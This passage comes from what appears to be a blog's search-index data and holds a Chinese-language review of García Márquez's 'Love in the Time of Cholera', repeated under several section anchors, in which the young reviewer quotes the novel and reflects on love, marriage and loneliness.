胡维纳尔医生是个真正的绅士，言行举止高雅上流，但是费尔明娜却在与他共同生活的过程中处处感到“心累”。因为医生的高高在上且从不尊重她的劳动成果，认为“家务事”是简单的活，这种婚姻关系中双方地位的不对等让费尔明娜对这段感情的本质感到绝望。可以说结婚这么多年，费尔明娜虽然为医生做了一辈子家务，抚养了几个儿女，但他们的感情绝对不是马尔克斯心目中“真正的爱情”。这段话同样让我想起了我自己，因为我也很喜欢说“随便”。。。在与人相处的过程中也要保持真诚，衷心说出自己的真实想法。 事实上，胡维纳尔·乌尔比诺的追求从来不是用爱的语言表达的，而且奇怪的是—至少可以说是奇怪—像他那样一个天主教的卫士，向她提供的竟然仅限于世俗的好处：**安全感、和谐和幸福，这些东西一旦相加，或许看似爱情，也几乎等于爱情。但它们终究不是爱情。**这些疑虑增加了她的彷徨，因为她也并不坚信爱情当真就是她生活中最需要的东西。 。。。 作品内核分析再来看看作品的介绍“讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性”。 爱情是什么？为什么弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍能对费尔明娜说出“我为你保留了童真”？ 因为两人长达52年的小心翼翼的互相确认。 费尔明娜在看似“幸福美满”的婚姻中意识到了弗洛伦蒂诺这个”幽灵“在她的脑海之中挥之不去，意识到了物质的富足并不等于爱情，意识到了这种看似已经被升华成亲情的爱情背后渗透着女人对物质满足感的本质的误判。**她享受着与胡维纳尔在人前扮演恩爱夫妻的满足感，享受着医生为她带来的安定生活，享受着抚养孩子的成就感，这种安心感被她误认为爱情。**可她却没有意识到，这一切与胡维纳尔医生本人并没有多大关系，任何一个同样物质条件的男人，都能给她这一切。 弗洛伦蒂诺则更是在一次又一次地确认着自己对费尔明娜的感情，他不断地与各种女人开启新的感情，只为了把费尔明娜”忘掉“，但一次又一次地试图遗忘，一次又一次地确认感情，一次又一次地失败，”忘不了“，更说明了弗洛伦蒂诺对费尔明娜的痴情。弗洛伦蒂诺一开始地疯狂写情书是他精神世界的一场幼稚的狂欢，是对理想化的神话的费尔明娜的追求，但是当费尔明娜真正嫁人之后，试图忘掉她也好，证明也罢，**弗洛伦蒂诺所经历的一切都在不断擦亮这场狂欢，不断为当年的幼稚加上成熟的注脚。他一次又一次开启新的感情，一次又一次意识到费尔明娜在他内心中的特殊地位，一次又一次迷失了自我。**这也使得最后弗洛伦蒂诺时隔51年的表白如此震撼人心。 那么，爱情是这本书的全部吗？ 很显然不是的，弗洛伦蒂诺为什么无法爱人，在他疯狂的寻花问柳的过程中，有不少女人爱上了他，他也有过多次的爱上她人的错觉。那又是什么让弗洛伦蒂诺无法达到结婚的现实呢？ 是孤独。 怪罪于“","date":"2022-01-18","objectID":"/articles/El-Amor-En-Los-Tiempos-Del-Colera/:0:0","series":null,"tags":null,"title":"怪罪于爱的孤独 《霍乱时期的爱情》书评","uri":"/articles/El-Amor-En-Los-Tiempos-Del-Colera/#句子摘抄"},{"categories":["文学"],"content":" 引言我是不配谈“爱”的，因为我只是个18岁的“小孩”，并没有情感经历。 但是这本在标题就明目张胆地写着爱情的书，写书评又绕不过对”爱情“的讨论，我只能边抄原文边说说我不成熟的感想。 故事梗概相当简单：穷小子弗洛伦蒂诺·阿里萨在十八岁时对费尔明娜·达萨一见钟情，双方突破重重阻碍（主要是费尔明娜的父亲的反对）互通了几百封情书，最后见面时，费尔明娜看着眼前这个可怜人，与她心目中的那个人相距甚远，意识到他们之间不过是一场幻觉，便拒绝了弗洛伦蒂诺的求婚。之后费尔明娜嫁给了权贵，一个真正的绅士胡维纳尔·阿尔比诺医生，过了几十年的还算恩爱的夫妻生活，而弗洛伦蒂诺则一直把对费尔明娜的爱藏在心里，几十年间在社会上摸爬滚打，最后当上了航运公司的董事长。胡维纳尔·阿尔比诺医生去世那天，弗洛伦蒂诺第一时间找到费尔明娜，重申了自己对她矢志不渝的爱情，经过一段时间的磨合之后，两个老人终于完成了这场长达51年的爱情长跑。 看看简介： 《霍乱时期的爱情》是加西亚•马尔克斯获得诺贝尔文学奖之后完成的第一部小说。讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性：忠贞的、隐秘的、粗暴的、羞怯的、柏拉图式的、放荡的、转瞬即逝的、生死相依的……再现了时光的无情流逝，被誉为“人类有史以来最伟大的爱情小说”，是20世纪最重要的经典文学巨著之一。 但粗看这个故事情节其实相当毁三观，弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍对费尔明娜说了那句著名的“我为你保留了童真”，形容这场爱情为“一生一世”。看起来非常的魔幻现实。 这究竟是不是又一个“盖茨比”式的故事，是不是又一个穷小子逆袭抱得美人归的滥俗套路？马尔克斯当然不可能这么肤浅，但在这里强行上升到人生的高度也大可不必，马尔克斯认为的爱情的本质是什么呢?先看看我在书中的一些摘抄。 句子摘抄 “见到你我才发现，我们之间不过是一场幻觉。”（费尔明娜·达萨） 这是费尔明娜对弗洛伦蒂诺说的话，费尔明娜在见到弗洛伦蒂诺可怜的境遇后，瞬间明白了自己对他的感情不过是一种“同情心”，她称呼他为“可怜人”，对他的一切美好的幻想都烟消云散，摧毁爱情的有时不是拒绝，而是怜悯，“兴味索然，自欺欺人”，即使在这之前她还被一封一封文辞真挚隽永的情书所打动，就在这一刻，费尔明娜决心在记忆中抹去关于弗洛伦蒂诺的记忆，之后不久，她就嫁给了胡维纳尔·阿尔比诺医生。 书信是思想最好的载体。文字能窥见一个人的灵魂，却因留下了过大的想象空间而容易无限放大对对方的固有印象。这里还有一句： 他只要看到那个女孩就感到心满意足了。渐渐地,他把她理想化了,把一些不可能的美德和想象出来的情感都安在她的身上。 陷入爱情的男女往往容易给他人加上不切实际的各种幻想（俗称“恋爱滤镜”），他们爱的已经不是具体的人，而是一种符号化的理想，所谓“距离产生美”可能也是这种原理吧。追求一个理想化的对象随之自身也收获了一种崇高感并乐在其中，这是大部分世俗化的爱情的普遍心理，这当然是伟大的，是浪漫的，是让追求者和被追求者都能产生价值感的，但是在马尔克斯笔下，费尔明娜亲口拒绝了这段感情。她认为自己是不爱弗洛伦蒂诺的。 如果两人能及时明白，比起婚姻中的巨大灾难，日常的琐碎烦恼更加难以躲避，或许他们的生活完全会是另一副样子。而如果说，他们在共同的生活中也多少学到了点什么，那就是智慧往往在已无用武之地时才来到我们身边。 婚姻或恋爱中的巨大灾难，反而能使双方建立起一种“革命友谊”。而日常碎屑的烦恼则会一点点磨碎理想化爱情的棱角，这既是互相加深了解的过程，也是理想化的对方跌落神坛的过程，如果在深入了解之后，依然能够常驻这份爱意，那这就会是一段相当幸福的感情。但大部分形成已久的羁绊，最后形成的也不过是一种共同生活的“默契”，早已缺乏了当年的激情。 她在儿子身体康复期间，训斥了他被动等候回音的消极状态。她提醒他，弱者永远无法进入爱情的王国，因为那是一个严酷、吝啬的国度，女人只会对意志坚强的男人俯首称臣，因为只有这样的男人才能带给她们安全感，她们渴望那种安全感，以面对生活的挑战。 弗洛伦蒂诺的母亲对弗洛伦蒂诺的告诫。男人应该意志坚强，坚定不移地追求所爱，弗洛伦蒂诺也许听懂了这份告诫，甚至做得有些过了头，他用了51年的时间确认了自己对费尔明娜的感情。 他原本不是她会选择的那种人，但他那过时的眼镜、神甫似的长袍，以及举手投足间的神秘感激起了她难以抵抗的好奇心，而她却从来没有想过，好奇心也是爱情的种种伪装之一。 对一个人产生好奇心，想要深入了解某个人，这也许是爱情产生的前奏。 她辩解说，爱情，首先是一种本能，“要么生下来就会，要么永远都不会”。 不知道该怎么评价这段话。。。有点扎心。 只有她们自己知道，她们曾经疯狂爱着的那个男人—尽管他或许也爱着她们—给她们带来的负担有多么沉重，她们不得不照顾他们直到最后一口气，喂他们吃喝，给他们换下脏兮兮的尿布，用母亲式的巧妙花招哄他们开心，以减轻他们清晨走出家门去直面现实的恐惧。可当看到他们受自己的鼓动离开家门，准备一口去吞掉整个世界时，她们又开始害怕男人会一去不复返。这就是生活。而爱，如果真的存在，则是另一回事：另一种生活。 爱情的负担同样无比沉重，也许为了抽象意义下的“生活”，双方都不得不放弃个人最初的理想（当然也有可能相互扶持着共同完成各自的理想，这是最优情况，这里谈普遍意义下的“妥协”），正如《个人的体验》中的鸟一样，接受了家庭的责任就意味着失去了实现自我理想的机会，就意味着晚年有可能带来的后悔。再来看下一句: “回答他说你愿意，”她对侄女说，“即便你害怕得要死，即便你以后可能后悔。因为如果你说不，无论如何你都会后悔一辈子。” 这是费尔明娜收到弗洛伦蒂诺求婚时，姑妈做出的建议。未做之事或是未答应之事往往带给人的后悔感比答应之事更强。去做一件事，意味着已经穷尽了这件事的可能性，而拒绝一件事，则意味着失去了一种可能的未来。每每想起只会不断自问：“如果我去做了，那么现在会怎样。”但时间对每个人都是公平的，如果去做了某事，也就意味着那时的你放弃了成为现在的你的机会，有可能会在失败中更加潦倒，但困住一个人的，从来都不是穷困潦倒，而是不甘心，是那句“我本可以”。 而如果她真的问了—依照着那无数条仪式性的家庭礼节中的一条—他就会看着报纸，连眼皮也不抬地回答说：“随便什么都行。”他说的是真心话，而且和颜悦色，自认为没有哪个丈夫比他更好商量了。可到了吃饭的时候，“随便什么”就不行了，必须符合他的喜好，不能有半点瑕疵：肉不能有肉味儿，鱼不能有鱼味儿，猪肉不能吃出疥疮似的腥味，鸡肉不能吃出鸡毛的味道。即便不是吃芦笋的季节，也得不惜代价地为他找来，为的是让他能在自己尿液的芬芳气息中怡然自得。她不怨他，只怨生活。但他是生活中难以安抚的主角。只要稍有怀疑，他就会把桌上的盘子一推，说：“这顿饭没有用爱来做。” 胡维纳尔·阿尔比诺医生与费尔明娜的婚姻生活。 胡维纳尔医生是个真正的绅士，言行举止高雅上流，但是费尔明娜却在与他共同生活的过程中处处感到“心累”。因为医生的高高在上且从不尊重她的劳动成果，认为“家务事”是简单的活，这种婚姻关系中双方地位的不对等让费尔明娜对这段感情的本质感到绝望。可以说结婚这么多年，费尔明娜虽然为医生做了一辈子家务，抚养了几个儿女，但他们的感情绝对不是马尔克斯心目中“真正的爱情”。这段话同样让我想起了我自己，因为我也很喜欢说“随便”。。。在与人相处的过程中也要保持真诚，衷心说出自己的真实想法。 事实上，胡维纳尔·乌尔比诺的追求从来不是用爱的语言表达的，而且奇怪的是—至少可以说是奇怪—像他那样一个天主教的卫士，向她提供的竟然仅限于世俗的好处：**安全感、和谐和幸福，这些东西一旦相加，或许看似爱情，也几乎等于爱情。但它们终究不是爱情。**这些疑虑增加了她的彷徨，因为她也并不坚信爱情当真就是她生活中最需要的东西。 。。。 作品内核分析再来看看作品的介绍“讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性”。 爱情是什么？为什么弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍能对费尔明娜说出“我为你保留了童真”？ 因为两人长达52年的小心翼翼的互相确认。 费尔明娜在看似“幸福美满”的婚姻中意识到了弗洛伦蒂诺这个”幽灵“在她的脑海之中挥之不去，意识到了物质的富足并不等于爱情，意识到了这种看似已经被升华成亲情的爱情背后渗透着女人对物质满足感的本质的误判。**她享受着与胡维纳尔在人前扮演恩爱夫妻的满足感，享受着医生为她带来的安定生活，享受着抚养孩子的成就感，这种安心感被她误认为爱情。**可她却没有意识到，这一切与胡维纳尔医生本人并没有多大关系，任何一个同样物质条件的男人，都能给她这一切。 弗洛伦蒂诺则更是在一次又一次地确认着自己对费尔明娜的感情，他不断地与各种女人开启新的感情，只为了把费尔明娜”忘掉“，但一次又一次地试图遗忘，一次又一次地确认感情，一次又一次地失败，”忘不了“，更说明了弗洛伦蒂诺对费尔明娜的痴情。弗洛伦蒂诺一开始地疯狂写情书是他精神世界的一场幼稚的狂欢，是对理想化的神话的费尔明娜的追求，但是当费尔明娜真正嫁人之后，试图忘掉她也好，证明也罢，**弗洛伦蒂诺所经历的一切都在不断擦亮这场狂欢，不断为当年的幼稚加上成熟的注脚。他一次又一次开启新的感情，一次又一次意识到费尔明娜在他内心中的特殊地位，一次又一次迷失了自我。**这也使得最后弗洛伦蒂诺时隔51年的表白如此震撼人心。 那么，爱情是这本书的全部吗？ 很显然不是的，弗洛伦蒂诺为什么无法爱人，在他疯狂的寻花问柳的过程中，有不少女人爱上了他，他也有过多次的爱上她人的错觉。那又是什么让弗洛伦蒂诺无法达到结婚的现实呢？ 是孤独。 怪罪于“","date":"2022-01-18","objectID":"/articles/El-Amor-En-Los-Tiempos-Del-Colera/:0:0","series":null,"tags":null,"title":"怪罪于爱的孤独 《霍乱时期的爱情》书评","uri":"/articles/El-Amor-En-Los-Tiempos-Del-Colera/#作品内核分析"},{"categories":["文学"],"content":" 引言我是不配谈“爱”的，因为我只是个18岁的“小孩”，并没有情感经历。 但是这本在标题就明目张胆地写着爱情的书，写书评又绕不过对”爱情“的讨论，我只能边抄原文边说说我不成熟的感想。 故事梗概相当简单：穷小子弗洛伦蒂诺·阿里萨在十八岁时对费尔明娜·达萨一见钟情，双方突破重重阻碍（主要是费尔明娜的父亲的反对）互通了几百封情书，最后见面时，费尔明娜看着眼前这个可怜人，与她心目中的那个人相距甚远，意识到他们之间不过是一场幻觉，便拒绝了弗洛伦蒂诺的求婚。之后费尔明娜嫁给了权贵，一个真正的绅士胡维纳尔·阿尔比诺医生，过了几十年的还算恩爱的夫妻生活，而弗洛伦蒂诺则一直把对费尔明娜的爱藏在心里，几十年间在社会上摸爬滚打，最后当上了航运公司的董事长。胡维纳尔·阿尔比诺医生去世那天，弗洛伦蒂诺第一时间找到费尔明娜，重申了自己对她矢志不渝的爱情，经过一段时间的磨合之后，两个老人终于完成了这场长达51年的爱情长跑。 看看简介： 《霍乱时期的爱情》是加西亚•马尔克斯获得诺贝尔文学奖之后完成的第一部小说。讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性：忠贞的、隐秘的、粗暴的、羞怯的、柏拉图式的、放荡的、转瞬即逝的、生死相依的……再现了时光的无情流逝，被誉为“人类有史以来最伟大的爱情小说”，是20世纪最重要的经典文学巨著之一。 但粗看这个故事情节其实相当毁三观，弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍对费尔明娜说了那句著名的“我为你保留了童真”，形容这场爱情为“一生一世”。看起来非常的魔幻现实。 这究竟是不是又一个“盖茨比”式的故事，是不是又一个穷小子逆袭抱得美人归的滥俗套路？马尔克斯当然不可能这么肤浅，但在这里强行上升到人生的高度也大可不必，马尔克斯认为的爱情的本质是什么呢?先看看我在书中的一些摘抄。 句子摘抄 “见到你我才发现，我们之间不过是一场幻觉。”（费尔明娜·达萨） 这是费尔明娜对弗洛伦蒂诺说的话，费尔明娜在见到弗洛伦蒂诺可怜的境遇后，瞬间明白了自己对他的感情不过是一种“同情心”，她称呼他为“可怜人”，对他的一切美好的幻想都烟消云散，摧毁爱情的有时不是拒绝，而是怜悯，“兴味索然，自欺欺人”，即使在这之前她还被一封一封文辞真挚隽永的情书所打动，就在这一刻，费尔明娜决心在记忆中抹去关于弗洛伦蒂诺的记忆，之后不久，她就嫁给了胡维纳尔·阿尔比诺医生。 书信是思想最好的载体。文字能窥见一个人的灵魂，却因留下了过大的想象空间而容易无限放大对对方的固有印象。这里还有一句： 他只要看到那个女孩就感到心满意足了。渐渐地,他把她理想化了,把一些不可能的美德和想象出来的情感都安在她的身上。 陷入爱情的男女往往容易给他人加上不切实际的各种幻想（俗称“恋爱滤镜”），他们爱的已经不是具体的人，而是一种符号化的理想，所谓“距离产生美”可能也是这种原理吧。追求一个理想化的对象随之自身也收获了一种崇高感并乐在其中，这是大部分世俗化的爱情的普遍心理，这当然是伟大的，是浪漫的，是让追求者和被追求者都能产生价值感的，但是在马尔克斯笔下，费尔明娜亲口拒绝了这段感情。她认为自己是不爱弗洛伦蒂诺的。 如果两人能及时明白，比起婚姻中的巨大灾难，日常的琐碎烦恼更加难以躲避，或许他们的生活完全会是另一副样子。而如果说，他们在共同的生活中也多少学到了点什么，那就是智慧往往在已无用武之地时才来到我们身边。 婚姻或恋爱中的巨大灾难，反而能使双方建立起一种“革命友谊”。而日常碎屑的烦恼则会一点点磨碎理想化爱情的棱角，这既是互相加深了解的过程，也是理想化的对方跌落神坛的过程，如果在深入了解之后，依然能够常驻这份爱意，那这就会是一段相当幸福的感情。但大部分形成已久的羁绊，最后形成的也不过是一种共同生活的“默契”，早已缺乏了当年的激情。 她在儿子身体康复期间，训斥了他被动等候回音的消极状态。她提醒他，弱者永远无法进入爱情的王国，因为那是一个严酷、吝啬的国度，女人只会对意志坚强的男人俯首称臣，因为只有这样的男人才能带给她们安全感，她们渴望那种安全感，以面对生活的挑战。 弗洛伦蒂诺的母亲对弗洛伦蒂诺的告诫。男人应该意志坚强，坚定不移地追求所爱，弗洛伦蒂诺也许听懂了这份告诫，甚至做得有些过了头，他用了51年的时间确认了自己对费尔明娜的感情。 他原本不是她会选择的那种人，但他那过时的眼镜、神甫似的长袍，以及举手投足间的神秘感激起了她难以抵抗的好奇心，而她却从来没有想过，好奇心也是爱情的种种伪装之一。 对一个人产生好奇心，想要深入了解某个人，这也许是爱情产生的前奏。 她辩解说，爱情，首先是一种本能，“要么生下来就会，要么永远都不会”。 不知道该怎么评价这段话。。。有点扎心。 只有她们自己知道，她们曾经疯狂爱着的那个男人—尽管他或许也爱着她们—给她们带来的负担有多么沉重，她们不得不照顾他们直到最后一口气，喂他们吃喝，给他们换下脏兮兮的尿布，用母亲式的巧妙花招哄他们开心，以减轻他们清晨走出家门去直面现实的恐惧。可当看到他们受自己的鼓动离开家门，准备一口去吞掉整个世界时，她们又开始害怕男人会一去不复返。这就是生活。而爱，如果真的存在，则是另一回事：另一种生活。 爱情的负担同样无比沉重，也许为了抽象意义下的“生活”，双方都不得不放弃个人最初的理想（当然也有可能相互扶持着共同完成各自的理想，这是最优情况，这里谈普遍意义下的“妥协”），正如《个人的体验》中的鸟一样，接受了家庭的责任就意味着失去了实现自我理想的机会，就意味着晚年有可能带来的后悔。再来看下一句: “回答他说你愿意，”她对侄女说，“即便你害怕得要死，即便你以后可能后悔。因为如果你说不，无论如何你都会后悔一辈子。” 这是费尔明娜收到弗洛伦蒂诺求婚时，姑妈做出的建议。未做之事或是未答应之事往往带给人的后悔感比答应之事更强。去做一件事，意味着已经穷尽了这件事的可能性，而拒绝一件事，则意味着失去了一种可能的未来。每每想起只会不断自问：“如果我去做了，那么现在会怎样。”但时间对每个人都是公平的，如果去做了某事，也就意味着那时的你放弃了成为现在的你的机会，有可能会在失败中更加潦倒，但困住一个人的，从来都不是穷困潦倒，而是不甘心，是那句“我本可以”。 而如果她真的问了—依照着那无数条仪式性的家庭礼节中的一条—他就会看着报纸，连眼皮也不抬地回答说：“随便什么都行。”他说的是真心话，而且和颜悦色，自认为没有哪个丈夫比他更好商量了。可到了吃饭的时候，“随便什么”就不行了，必须符合他的喜好，不能有半点瑕疵：肉不能有肉味儿，鱼不能有鱼味儿，猪肉不能吃出疥疮似的腥味，鸡肉不能吃出鸡毛的味道。即便不是吃芦笋的季节，也得不惜代价地为他找来，为的是让他能在自己尿液的芬芳气息中怡然自得。她不怨他，只怨生活。但他是生活中难以安抚的主角。只要稍有怀疑，他就会把桌上的盘子一推，说：“这顿饭没有用爱来做。” 胡维纳尔·阿尔比诺医生与费尔明娜的婚姻生活。 胡维纳尔医生是个真正的绅士，言行举止高雅上流，但是费尔明娜却在与他共同生活的过程中处处感到“心累”。因为医生的高高在上且从不尊重她的劳动成果，认为“家务事”是简单的活，这种婚姻关系中双方地位的不对等让费尔明娜对这段感情的本质感到绝望。可以说结婚这么多年，费尔明娜虽然为医生做了一辈子家务，抚养了几个儿女，但他们的感情绝对不是马尔克斯心目中“真正的爱情”。这段话同样让我想起了我自己，因为我也很喜欢说“随便”。。。在与人相处的过程中也要保持真诚，衷心说出自己的真实想法。 事实上，胡维纳尔·乌尔比诺的追求从来不是用爱的语言表达的，而且奇怪的是—至少可以说是奇怪—像他那样一个天主教的卫士，向她提供的竟然仅限于世俗的好处：**安全感、和谐和幸福，这些东西一旦相加，或许看似爱情，也几乎等于爱情。但它们终究不是爱情。**这些疑虑增加了她的彷徨，因为她也并不坚信爱情当真就是她生活中最需要的东西。 。。。 作品内核分析再来看看作品的介绍“讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性”。 爱情是什么？为什么弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍能对费尔明娜说出“我为你保留了童真”？ 因为两人长达52年的小心翼翼的互相确认。 费尔明娜在看似“幸福美满”的婚姻中意识到了弗洛伦蒂诺这个”幽灵“在她的脑海之中挥之不去，意识到了物质的富足并不等于爱情，意识到了这种看似已经被升华成亲情的爱情背后渗透着女人对物质满足感的本质的误判。**她享受着与胡维纳尔在人前扮演恩爱夫妻的满足感，享受着医生为她带来的安定生活，享受着抚养孩子的成就感，这种安心感被她误认为爱情。**可她却没有意识到，这一切与胡维纳尔医生本人并没有多大关系，任何一个同样物质条件的男人，都能给她这一切。 弗洛伦蒂诺则更是在一次又一次地确认着自己对费尔明娜的感情，他不断地与各种女人开启新的感情，只为了把费尔明娜”忘掉“，但一次又一次地试图遗忘，一次又一次地确认感情，一次又一次地失败，”忘不了“，更说明了弗洛伦蒂诺对费尔明娜的痴情。弗洛伦蒂诺一开始地疯狂写情书是他精神世界的一场幼稚的狂欢，是对理想化的神话的费尔明娜的追求，但是当费尔明娜真正嫁人之后，试图忘掉她也好，证明也罢，**弗洛伦蒂诺所经历的一切都在不断擦亮这场狂欢，不断为当年的幼稚加上成熟的注脚。他一次又一次开启新的感情，一次又一次意识到费尔明娜在他内心中的特殊地位，一次又一次迷失了自我。**这也使得最后弗洛伦蒂诺时隔51年的表白如此震撼人心。 那么，爱情是这本书的全部吗？ 很显然不是的，弗洛伦蒂诺为什么无法爱人，在他疯狂的寻花问柳的过程中，有不少女人爱上了他，他也有过多次的爱上她人的错觉。那又是什么让弗洛伦蒂诺无法达到结婚的现实呢？ 是孤独。 怪罪于“","date":"2022-01-18","objectID":"/articles/El-Amor-En-Los-Tiempos-Del-Colera/:0:0","series":null,"tags":null,"title":"怪罪于爱的孤独 《霍乱时期的爱情》书评","uri":"/articles/El-Amor-En-Los-Tiempos-Del-Colera/#怪罪于爱的孤独"},{"categories":["文学"],"content":" 引言我是不配谈“爱”的，因为我只是个18岁的“小孩”，并没有情感经历。 但是这本在标题就明目张胆地写着爱情的书，写书评又绕不过对”爱情“的讨论，我只能边抄原文边说说我不成熟的感想。 故事梗概相当简单：穷小子弗洛伦蒂诺·阿里萨在十八岁时对费尔明娜·达萨一见钟情，双方突破重重阻碍（主要是费尔明娜的父亲的反对）互通了几百封情书，最后见面时，费尔明娜看着眼前这个可怜人，与她心目中的那个人相距甚远，意识到他们之间不过是一场幻觉，便拒绝了弗洛伦蒂诺的求婚。之后费尔明娜嫁给了权贵，一个真正的绅士胡维纳尔·阿尔比诺医生，过了几十年的还算恩爱的夫妻生活，而弗洛伦蒂诺则一直把对费尔明娜的爱藏在心里，几十年间在社会上摸爬滚打，最后当上了航运公司的董事长。胡维纳尔·阿尔比诺医生去世那天，弗洛伦蒂诺第一时间找到费尔明娜，重申了自己对她矢志不渝的爱情，经过一段时间的磨合之后，两个老人终于完成了这场长达51年的爱情长跑。 看看简介： 《霍乱时期的爱情》是加西亚•马尔克斯获得诺贝尔文学奖之后完成的第一部小说。讲述了一段跨越半个多世纪的爱情史诗，穷尽了所有爱情的可能性：忠贞的、隐秘的、粗暴的、羞怯的、柏拉图式的、放荡的、转瞬即逝的、生死相依的……再现了时光的无情流逝，被誉为“人类有史以来最伟大的爱情小说”，是20世纪最重要的经典文学巨著之一。 但粗看这个故事情节其实相当毁三观，弗洛伦蒂诺在与622个女人发生过肉体关系的情况下，仍对费尔明娜说了那句著名的“我为你保留了童真”，形容这场爱情为“一生一世”。看起来非常的魔幻现实。 这究竟是不是又一个“盖茨比”式的故事，是不是又一个穷小子逆袭抱得美人归的滥俗套路？马尔克斯当然不可能这么肤浅，但在这里强行上升到人生的高度也大可不必，马尔克斯认为的爱情的本质是什么呢?先看看我在书中的一些摘抄。 句子摘抄 “见到你我才发现，我们之间不过是一场幻觉。”（费尔明娜·达萨） 这是费尔明娜对弗洛伦蒂诺说的话，费尔明娜在见到弗洛伦蒂诺可怜的境遇后，瞬间明白了自己对他的感情不过是一种“同情心”，她称呼他为“可怜人”，对他的一切美好的幻想都烟消云散，摧毁爱情的有时不是拒绝，而是怜悯，“兴味索然，自欺欺人”，即使在这之前她还被一封一封文辞真挚隽永的情书所打动，就在这一刻，费尔明娜决心在记忆中抹去关于弗洛伦蒂诺的记忆，之后不久，她就嫁给了胡维纳尔·阿尔比诺医生。 书信是思想最好的载体。文字能窥见一个人的灵魂，却因留下了过大的想象空间而容易无限放大对对方的固有印象。这里还有一句： 他只要看到那个女孩就感到心满意足了。渐渐地,他把她理想化了,把一些不可能的美德和想象出来的情感都安在她的身上。 陷入爱情的男女往往容易给他人加上不切实际的各种幻想（俗称“恋爱滤镜”），他们爱的已经不是具体的人，而是一种符号化的理想，所谓“距离产生美”可能也是这种原理吧。追求一个理想化的对象随之自身也收获了一种崇高感并乐在其中，这是大部分世俗化的爱情的普遍心理，这当然是伟大的，是浪漫的，是让追求者和被追求者都能产生价值感的，但是在马尔克斯笔下，费尔明娜亲口拒绝了这段感情。她认为自己是不爱弗洛伦蒂诺的。 如果两人能及时明白，比起婚姻中的巨大灾难，日常的琐碎烦恼更加难以躲避，或许他们的生活完全会是另一副样子。而如果说，他们在共同的生活中也多少学到了点什么，那就是智慧往往在已无用武之地时才来到我们身边。 婚姻或恋爱中的巨大灾难，反而能使双方建立起一种“革命友谊”。而日常碎屑的烦恼则会一点点磨碎理想化爱情的棱角，这既是互相加深了解的过程，也是理想化的对方跌落神坛的过程，如果在深入了解之后，依然能够常驻这份爱意，那这就会是一段相当幸福的感情。但大部分形成已久的羁绊，最后形成的也不过是一种共同生活的“默契”，早已缺乏了当年的激情。 她在儿子身体康复期间，训斥了他被动等候回音的消极状态。她提醒他，弱者永远无法进入爱情的王国，因为那是一个严酷、吝啬的国度，女人只会对意志坚强的男人俯首称臣，因为只有这样的男人才能带给她们安全感，她们渴望那种安全感，以面对生活的挑战。 弗洛伦蒂诺的母亲对弗洛伦蒂诺的告诫。男人应该意志坚强，坚定不移地追求所爱，弗洛伦蒂诺也许听懂了这份告诫，甚至做得有些过了头，他用了51年的时间确认了自己对费尔明娜的感情。 他原本不是她会选择的那种人，但他那过时的眼镜、神甫似的长袍，以及举手投足间的神秘感激起了她难以抵抗的好奇心，而她却从来没有想过，好奇心也是爱情的种种伪装之一。 对一个人产生好奇心，想要深入了解某个人，这也许是爱情产生的前奏。 她辩解说，爱情，首先是一种本能，“要么生下来就会，要么永远都不会”。 不知道该怎么评价这段话。。。有点扎心。 只有她们自己知道，她们曾经疯狂爱着的那个男人—尽管他或许也爱着她们—给她们带来的负担有多么沉重，她们不得不照顾他们直到最后一口气，喂他们吃喝，给他们换下脏兮兮的尿布，用母亲式的巧妙花招哄他们开心，以减轻他们清晨走出家门去直面现实的恐惧。可当看到他们受自己的鼓动离开家门，准备一口去吞掉整个世界时，她们又开始害怕男人会一去不复返。这就是生活。而爱，如果真的存在，则是另一回事：另一种生活。 爱情的负担同样无比沉重，也许为了抽象意义下的“生活”，双方都不得不放弃个人最初的理想（当然也有可能相互扶持着共同完成各自的理想，这是最优情况，这里谈普遍意义下的“妥协”），正如《个人的体验》中的鸟一样，接受了家庭的责任就意味着失去了实现自我理想的机会，就意味着晚年有可能带来的后悔。再来看下一句: “回答他说你愿意，”她对侄女说，“即便你害怕得要死，即便你以后可能后悔。因为如果你说不，无论如何你都会后悔一辈子。” 这是费尔明娜收到弗洛伦蒂诺求婚时，姑妈做出的建议。未做之事或是未答应之事往往带给人的后悔感比答应之事更强。去做一件事，意味着已经穷尽了这件事的可能性，而拒绝一件事，则意味着失去了一种可能的未来。每每想起只会不断自问：“如果我去做了，那么现在会怎样。”但时间对每个人都是公平的，如果去做了某事，也就意味着那时的你放弃了成为现在的你的机会，有可能会在失败中更加潦倒，但困住一个人的，从来都不是穷困潦倒，而是不甘心，是那句“我本可以”。 而如果她真的问了—依照着那无数条仪式性的家庭礼节中的一条—他就会看着报纸，连眼皮也不抬地回答说：“随便什么都行。”他说的是真心话，而且和颜悦色，自认为没有哪个丈夫比他更好商量了。可到了吃饭的时候，“随便什么”就不行了，必须符合他的喜好，不能有半点瑕疵：肉不能有肉味儿，鱼不能有鱼味儿，猪肉不能吃出疥疮似的腥味，鸡肉不能吃出鸡毛的味道。即便不是吃芦笋的季节，也得不惜代价地为他找来，为的是让他能在自己尿液的芬芳气息中怡然自得。她不怨他，只怨生活。但他是生活中难以安抚的主角。只要稍有怀疑，他就会把桌上的盘子一推，说：“这顿饭没有用爱来做。” 胡维纳尔·阿尔比诺医生与费尔明娜的婚姻生活。 胡维纳尔医生是个真正的绅士，言行举止高雅上流，但是费尔明娜却在与他共同生活的过程中处处感到“心累”。因为医生的高高在上且从不尊重她的劳动成果，认为“家务事”是简单的活，这种婚姻关系中双方地位的不对等让费尔明娜对这段感情的本质感到绝望。可以说结婚这么多年，费尔明娜虽然为医生做了一辈子家务，抚养了几个儿女，但他们的感情绝对不是马尔克斯心目中“真正的爱情”。这段话同样让我想起了我自己，因为我也很喜欢说“随便”。。。在与人相处的过程中也要保持真诚，衷心说出自己的真实想法。 事实上，胡维纳尔·乌尔比诺的追求从来不是用爱的语言表达的，而且奇怪的是—至少可以说是奇怪—像他那样一个天主教的卫士，向她提供的竟然仅限于世俗的好处：**安全感、和谐和幸福，这些东西一旦相加，或许看似爱情，也几乎等于爱情。但它们终究不是爱情。**这些疑虑增加了她的彷徨，因为她也并不坚信爱情当真就是她生活中最需要的东西。 。。。 